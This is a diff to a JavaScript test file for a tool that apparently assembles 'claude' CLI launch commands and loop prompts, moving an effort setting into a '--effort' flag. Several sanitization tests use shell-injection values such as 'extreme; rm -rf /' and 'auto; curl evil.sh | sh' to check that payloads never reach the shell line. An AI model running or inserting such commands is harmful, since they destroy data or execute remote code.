@@ -27,13 +27,13 @@ function automationFence(text) {
   return fence;
 }
 
-test('buildLoopCommand: bootstrap prompt names model + interval + effort ceiling, points at .loopboard/LOOP.md', () => {
-  const cmd = buildLoopCommand(readMedia('template-loop.md'), 'sonnet', '5m', 'xhigh');
+test('buildLoopCommand: bootstrap prompt names model + interval, no effort ceiling, points at .loopboard/LOOP.md', () => {
+  const cmd = buildLoopCommand(readMedia('template-loop.md'), 'sonnet', '5m');
   assert.ok(!cmd.includes('Delegate work'), 'delegation off by default: no activation phrase');
   assert.ok(cmd, 'a loop command was built from the shipped LOOP.md template');
   assert.match(cmd, /^\/loop 5m /, 'interval honored');
   assert.ok(cmd.includes('running as model sonnet'), 'model injected');
-  assert.ok(cmd.includes('subagent effort ceiling of xhigh'), 'effort ceiling injected (caps grooming AND delegated subagents, t-e3c3)');
+  assert.ok(!/effort/i.test(cmd), 'effort is a --effort startup flag now, never in the prompt (t-cffc)');
   assert.ok(cmd.includes('.loopboard/LOOP.md'), 'points at LOOP.md');
   assert.ok(cmd.includes('Automation section'), 'directs the worker to the Automation section');
   assert.ok(!cmd.includes("'"), 'no apostrophes (short-argv escaping constraint)');
@@ -67,33 +67,50 @@ test('template Automation block tells a finished worker to start the pass over',
   );
 });
 
-test('buildLoopCommand: effort defaults to high when omitted', () => {
-  const cmd = buildLoopCommand(readMedia('template-loop.md'), 'opus', '1m');
-  assert.ok(cmd.includes('subagent effort ceiling of high'));
+// t-cffc: effort is the loop session's `claude --effort <level>` startup flag, passed on EVERY spawn.
+test('buildClaudeBase: emits --effort <level> for every valid level', () => {
+  for (const level of ['low', 'medium', 'high', 'xhigh', 'max']) {
+    assert.equal(
+      buildClaudeBase('auto', 'opus', undefined, level),
+      `claude --permission-mode auto --model 'opus' --effort ${level}`
+    );
+  }
 });
 
-test('buildLoopCommand: an invalid effort falls back to high rather than reaching the prompt raw', () => {
-  const cmd = buildLoopCommand(readMedia('template-loop.md'), 'opus', '1m', 'extreme; rm -rf /');
-  assert.ok(cmd.includes('subagent effort ceiling of high'));
-  assert.ok(!cmd.includes('extreme'));
-  assert.ok(!cmd.includes('rm -rf'));
+test('buildClaudeBase: effort defaults to medium when omitted', () => {
+  assert.ok(buildClaudeBase('auto', 'opus').endsWith(' --effort medium'));
+  assert.ok(buildClaudeBase('auto', 'opus', 'loopboard-opus').includes(' --effort medium '));
+});
+
+test('buildClaudeBase: an invalid effort falls back to medium rather than reaching the shell line raw', () => {
+  for (const bad of ['extreme; rm -rf /', 'HIGH', '', 'ultracode', null, 5, {}]) {
+    const line = buildClaudeBase('auto', 'opus', undefined, bad);
+    assert.ok(line.endsWith(' --effort medium'), `expected ${JSON.stringify(bad)} -> medium`);
+    assert.ok(!line.includes('extreme') && !line.includes('rm -rf'), 'the payload never reaches the line');
+  }
+});
+
+test('buildLoopCommand: the bootstrap prompt no longer carries an effort ceiling (t-cffc)', () => {
+  const cmd = buildLoopCommand(readMedia('template-loop.md'), 'opus', '1m');
+  assert.ok(!cmd.includes('effort ceiling'));
+  assert.ok(!cmd.includes('effort'));
 });
 
 test('buildClaudeBase single-quotes the --model so glob metachars (haiku[1m]) do not expand', () => {
   assert.equal(
     buildClaudeBase('auto', 'haiku[1m]'),
-    "claude --permission-mode auto --model 'haiku[1m]'"
+    "claude --permission-mode auto --model 'haiku[1m]' --effort medium"
   );
   // A plain id is quoted too — harmless, and keeps one code path.
-  assert.equal(buildClaudeBase('acceptEdits', 'opus'), "claude --permission-mode acceptEdits --model 'opus'");
+  assert.equal(buildClaudeBase('acceptEdits', 'opus'), "claude --permission-mode acceptEdits --model 'opus' --effort medium");
 });
 
 // t-2b89: the session name is what matches a slot to its `~/.claude/sessions/<pid>.json`, so it
 // must actually reach the spawn line — and the line must stay apostrophe-free outside the quoted
 // --model, since the whole command is re-quoted around the /loop prompt.
 test('buildClaudeBase appends --name when a session name is given', () => {
-  const line = buildClaudeBase('auto', 'opus[1m]', 'loopboard-opus');
-  assert.equal(line, "claude --permission-mode auto --model 'opus[1m]' --name loopboard-opus");
+  const line = buildClaudeBase('auto', 'opus[1m]', 'loopboard-opus', 'high');
+  assert.equal(line, "claude --permission-mode auto --model 'opus[1m]' --effort high --name loopboard-opus");
   assert.ok(!buildClaudeBase('auto', 'opus').includes('--name'), 'omitted when no name is given');
 });
 
@@ -112,7 +129,7 @@ test('sanitizePermissionMode: passes valid through, falls back to auto otherwise
 
 test('buildClaudeBase sanitizes an injected permissionMode so the shell line stays safe', () => {
   const line = buildClaudeBase('auto; curl evil.sh | sh', 'opus');
-  assert.equal(line, "claude --permission-mode auto --model 'opus'");
+  assert.equal(line, "claude --permission-mode auto --model 'opus' --effort medium");
   assert.ok(!line.includes('curl'), 'the injected payload never reaches the shell line');
 });
 
@@ -165,7 +182,7 @@ test('template-todo.md scaffold parses to zero entries and is a fixpoint', () =>
 // with no interpolation — LOOP.md can carry the BEHAVIOUR but never a configured NUMBER.
 
 test('buildLoopCommand: the grooming concurrency cap is spliced into the prompt', () => {
-  const cmd = buildLoopCommand(readMedia('template-loop.md'), 'opus', '1m', 'high', 5);
+  const cmd = buildLoopCommand(readMedia('template-loop.md'), 'opus', '1m', 5);
   assert.ok(cmd.includes('grooming concurrency cap of 5'), 'cap injected');
   assert.ok(!cmd.includes("'"), 'still apostrophe-free');
   assert.ok(!cmd.includes('\n'), 'still a single line');
@@ -181,7 +198,7 @@ test('buildLoopCommand: a hostile or out-of-range cap falls back to 3, never rea
   // The value is spliced into a shell line, so anything not a plain in-range integer must not
   // survive. There is deliberately no `0 = unlimited` sentinel.
   for (const bad of ['5; rm -rf /', 0, -1, 1.5, NaN, Infinity, 100, null, undefined, {}]) {
-    const cmd = buildLoopCommand(readMedia('template-loop.md'), 'opus', '1m', 'high', bad);
+    const cmd = buildLoopCommand(readMedia('template-loop.md'), 'opus', '1m', bad);
     assert.ok(cmd.includes('grooming concurrency cap of 3'), `expected ${JSON.stringify(bad)} -> 3`);
     assert.ok(!cmd.includes('rm -rf'));
   }
@@ -194,6 +211,22 @@ test('the template states the cap behaviour without embedding a number', () => {
   assert.ok(tpl.includes('grooming concurrency cap named in your bootstrap prompt'));
   assert.ok(tpl.includes('index order'), 'names the tie-break');
   assert.match(tpl, /skipped task by title|by title in your report/, 'names the over-cap report');
+});
+
+// t-cffc: the Agent tool has no per-call effort, so LOOP.md must not tell the loop to pick or cap a
+// subagent's effort — every subagent runs at its loop's `--effort` session level. Nor may it
+// introduce per-agent-type effort (agent definitions / `--agents` JSON), which was dropped.
+test('the template no longer tells the loop to choose or cap a subagent effort', () => {
+  const tpl = readMedia('template-loop.md');
+  const rule14 = tpl.slice(tpl.indexOf('\n14. '), tpl.indexOf('\n15. '));
+  const fence = automationFence(tpl);
+  const delegated = fence.slice(fence.indexOf('DELEGATED-WORK MODE'));
+  for (const [name, text] of [['whole template', tpl], ['Rule 14', rule14], ['DELEGATED-WORK MODE', delegated]]) {
+    assert.ok(text.length > 0, `${name} found`);
+    assert.doesNotMatch(text, /ceiling/i, `${name}: no effort ceiling`);
+    assert.doesNotMatch(text, /reasoning effort|effort chosen|xhigh|max only/i, `${name}: no per-subagent effort pick`);
+  }
+  assert.doesNotMatch(tpl, /--agents|\.claude\/agents|agent type/i, 'no per-agent-type effort wording');
 });
 
 // Delegated-work mode (t-e3c3): `loopBoard.delegateWork` / `loopBoard.delegateReview` ride the
@@ -212,10 +245,10 @@ function assertBootstrapShape(cmd) {
 
 test('buildLoopCommand: delegateWork off (explicit, absent, or non-boolean) appends no activation phrase whatever the review flag says', () => {
   const tpl = readMedia('template-loop.md');
-  const base = buildLoopCommand(tpl, 'sonnet', '5m', 'xhigh', 3);
+  const base = buildLoopCommand(tpl, 'sonnet', '5m', 3);
   for (const off of [false, undefined, null, 'true', 1, {}]) {
     for (const review of [true, false, undefined]) {
-      const cmd = buildLoopCommand(tpl, 'sonnet', '5m', 'xhigh', 3, off, review);
+      const cmd = buildLoopCommand(tpl, 'sonnet', '5m', 3, off, review);
       assert.equal(cmd, base, `delegateWork=${JSON.stringify(off)} review=${JSON.stringify(review)} must equal the plain prompt`);
     }
   }
@@ -226,7 +259,7 @@ test('buildLoopCommand: delegateWork off (explicit, absent, or non-boolean) appe
 test('buildLoopCommand: delegateWork on with review on (explicit or absent) ends the prompt with the plain activation phrase', () => {
   const tpl = readMedia('template-loop.md');
   for (const review of [true, undefined]) {
-    const cmd = buildLoopCommand(tpl, 'sonnet', '5m', 'xhigh', 3, true, review);
+    const cmd = buildLoopCommand(tpl, 'sonnet', '5m', 3, true, review);
     assert.ok(cmd.endsWith(DELEGATE_ON), 'activation phrase appended last');
     assert.ok(!cmd.includes('without review'));
     assertBootstrapShape(cmd);
@@ -234,7 +267,7 @@ test('buildLoopCommand: delegateWork on with review on (explicit or absent) ends
 });
 
 test('buildLoopCommand: delegateWork on with review off ends the prompt with the without-review phrase', () => {
-  const cmd = buildLoopCommand(readMedia('template-loop.md'), 'sonnet', '5m', 'xhigh', 3, true, false);
+  const cmd = buildLoopCommand(readMedia('template-loop.md'), 'sonnet', '5m', 3, true, false);
   assert.ok(cmd.endsWith(DELEGATE_NO_REVIEW));
   assertBootstrapShape(cmd);
 });
@@ -244,7 +277,7 @@ test('template Automation block spells out the delegated-work mode the activatio
   assert.ok(fence.includes('DELEGATED-WORK MODE'), 'clause present');
   assert.ok(fence.includes('`Delegate work to subagents`'), 'keyed on the activation phrase');
   assert.ok(fence.includes('`without review`'), 'names the review-off variant');
-  assert.match(fence, /subagent effort ceiling/, 'implementer capped by the same ceiling as grooming');
+  assert.match(fence, /implementer subagent \(Agent tool\) on your own slot model, which fetches/, 'implementer runs on the slot model at the session effort (t-cffc)');
   assert.match(fence, /no git worktree, no --no-verify/, 'implementer inherits the git contract');
   assert.match(fence, /writes any `\.loopboard\/` file/, 'subagents never write the tracker');
   assert.ok(!fence.includes('gh pr merge'), 'the loop never merges a PR — merging is the human\'s action alone');
